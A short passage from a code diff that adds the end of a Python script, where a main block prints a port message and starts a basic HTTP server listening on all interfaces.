+        pass
+
+
+if __name__ == "__main__":
+    print(f"Server running on port {PORT}")
+    HTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
